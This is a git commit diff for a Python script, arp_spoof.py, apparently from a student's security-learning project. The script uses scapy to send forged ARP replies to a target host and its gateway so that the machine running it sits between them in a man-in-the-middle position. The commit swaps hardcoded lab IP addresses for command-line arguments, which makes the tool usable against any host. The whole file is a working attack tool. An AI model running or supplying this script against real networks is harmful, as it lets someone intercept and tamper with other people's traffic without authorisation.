1cb5e5c85e4e317f06d29db80db2576ed5d6b75d
Abhay-Mahanta <abhay.17189@sakec.ac.in>
2024-08-01 20:13:25 +0530

    Update arp_spoof.py

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
-import subprocess
 import scapy.all as scapy
 import time
+import argparse
 
 def scan(target_ip):
     arp_request = scapy.ARP(pdst = target_ip)
@@ -12,25 +12,36 @@ def scan(target_ip):
     return answered[0][1].hwsrc
 
 def arpspoof(target_ip, gateway_ip):
-	target_mac = scan(target_ip)
-	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip)
-	scapy.send(packet, verbose = False)
+    target_mac = scan(target_ip)
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip)
+    scapy.send(packet, verbose = False)
 
 def restore(target_ip, gateway_ip):
-	target_mac = scan(target_ip)
-	gateway_mac = scan(gateway_ip)
-	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip, hwsrc = gateway_mac)
-	scapy.send(packet, verbose = False)
+    target_mac = scan(target_ip)
+    gateway_mac = scan(gateway_ip)
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip, hwsrc = gateway_mac)
+    scapy.send(packet, verbose = False)
 
-count = 2
-try:
-	while True:
-		arpspoof("192.168.92.134", "192.168.92.2")
-		arpspoof("192.168.92.2", "192.168.92.134")
-		print("\r[+] packets sent = " + str(count), end = "")
-		count += 2
-		time.sleep(2)
-except:
-	KeyboardInterrupt
-	print("\nExiting..")
-	restore("192.168.92.134", "192.168.92.2")
+def main():
+    parser = argparse.ArgumentParser(description="ARP Spoofing Script")
+    parser.add_argument("-t", "--target", required=True, help="Target IP address")
+    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
+    args = parser.parse_args()
+
+    target_ip = args.target
+    gateway_ip = args.gateway
+
+    count = 2
+    try:
+        while True:
+            arpspoof(target_ip, gateway_ip)
+            arpspoof(gateway_ip, target_ip)
+            print("\r[+] packets sent = " + str(count), end="")
+            count += 2
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\nExiting..")
+        restore(target_ip, gateway_ip)
+
+if __name__ == "__main__":
+    main()
